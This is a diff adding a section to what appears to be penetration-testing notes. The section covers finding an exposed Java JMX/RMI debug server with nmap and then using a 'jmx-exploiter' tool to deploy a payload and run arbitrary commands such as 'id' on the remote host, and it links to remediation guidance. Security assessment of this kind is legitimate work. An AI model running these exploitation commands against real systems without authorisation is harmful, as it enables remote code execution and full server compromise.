@@ -144,6 +144,33 @@ sudo nmap -sS -n --script "http-date" <target-ip>
 # reports the number of algorithms for compression & key exchange which are supported
 sudo nmap -sS --script "ssh2-enum-algos" <target-ip>
 
+# scanning the possiblity of a JMX server so that an attacker can gain remote code execution
+# java debug servers are often left open by this org's dev team. 
+sudo nmap -sV --script=rmi-dumpregistry <target-ip>
+
+# review the response for system information
+java -jar jmx-exploiter.jar <target-ip> <target-port> status
+
+# sending a malicious payload which will be executed through JMX by the remote server to allow us to gain full control.
+java -jar jmx-exploiter.jar -c config.properties <target-ip> <target-port> deployAll
+
+```
+# config.properties
+stagerPort=9999
+stagerHost=127.0.0.1
+defaultCmd=id
+```
+
+java -jar jmx-exploiter.jar -e id <target-ip> <target-port> execute
+
+# to remidate this, follow this
+https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html#gdeup
+
+
+# show that you can run arbitrary commands on the server, such as `id`. use the tool's `--help` argument to show the usage manual.
+Then, use this to build a command to gain control of the remote server.
+# observe that an attacker could exploit this vulnerability to execute commands and ultimately compromise this underlying operating system.
+
 # Good naming convention and output for your files
 # 3 main formats
 # - normal
